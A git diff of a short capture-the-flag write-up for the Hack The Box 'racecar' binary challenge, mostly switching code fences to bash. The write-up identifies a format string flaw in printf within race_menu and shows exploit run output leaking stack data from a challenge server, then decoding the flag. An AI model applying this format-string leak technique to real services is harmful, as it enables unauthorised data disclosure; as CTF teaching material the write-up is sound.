@@ -8,12 +8,12 @@ categories:
 
 Simple [pwn challenge](https://github.com/nair0lf32/CTF-Scripts/blob/master/Hackthebox/racecar/racecar) they said
 
-```
+```bash
 └──╼ $file racecar
 racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped
 ```
 
-```
+```bash
 └──╼ $checksec racecar
 [*] Checking for new versions of pwntools
     To disable this functionality, set the contents of /home/nair0lf32/.cache/.pwntools-cache-3.9/update to 'never' (old way).
@@ -30,7 +30,7 @@ racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamical
 ```
 It is an easy one they said!
 
-```
+```bash
 (gdb) info function
 All defined functions:
 
@@ -59,7 +59,7 @@ There is a format string vulnerability in `printf()` in the `race_menu` function
 
 the flag is right in the stack so [use this](https://github.com/nair0lf32/CTF-Scripts/blob/master/Hackthebox/racecar/exploit.py)
 
-```
+```bash
 └──╼ $python exploit.py
 [+] Opening connection to 138.68.129.154 on port 31614: Done
 /Racecar/exploit.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
@@ -76,14 +76,14 @@ b'\n[*] Waiting for the race to finish...\x1b[1;32m\n\n[+] You won the race!! Yo
 
 ...
 
-The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
+The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this:
 57d6f1c0170565b8d858152612565b996c57d6f1c057d6f340---FLAG: 0x7b4254480x5f7968770x5f6431640x34735f310x745f33760x665f33680x5f67346c0x745f6e300x355f33680x6b6334740x7d213f ---
 [*] Got EOF while reading in interactive
-$  
+$
 ```
 Now [decode](https://github.com/nair0lf32/CTF-Scripts/blob/master/Hackthebox/racecar/decode.py)
 
-```
+```bash
 └──╼ $python decode.py
 b'HTB{'
 b'HTB{why_'
@@ -91,6 +91,6 @@ b'HTB{why_d1d_'
 b'HTB{why_d1d_1_s4'
 ...
 
-b'HTB{SIKE_REDACTED}\x00'
+b'HTB{SIKE_REDACTED_XD}\x00'
 ```
 How easy that was!
